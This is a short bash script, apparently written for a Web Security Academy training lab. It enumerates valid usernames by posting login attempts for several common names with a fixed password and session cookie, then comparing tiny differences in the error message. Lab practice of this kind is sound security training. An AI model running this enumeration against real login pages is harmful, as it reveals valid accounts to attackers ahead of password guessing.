#!/bin/bash

# Test a few specific users and save full responses
for user in carlos admin root test guest; do
    echo "Fetching $user..."
    curl -s -X POST "https://0a0e004a04be7fa081da8aa70008003b.web-security-academy.net/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: session=Zj5ZT2FoyIS2txq2JmIWYDW41JykgiqP" \
        -d "username=$user&password=test" > "response_$user.html"
done

echo ""
echo "Looking for the exact difference..."

# Check exact error message string
for user in carlos admin root test guest; do
    error=$(grep -o 'Invalid username or password[.]' "response_$user.html")
    if [ -z "$error" ]; then
        error=$(grep -o 'Invalid username or password' "response_$user.html")
    fi
    echo "$user: '$error'"
done

# Clean up
rm response_*.html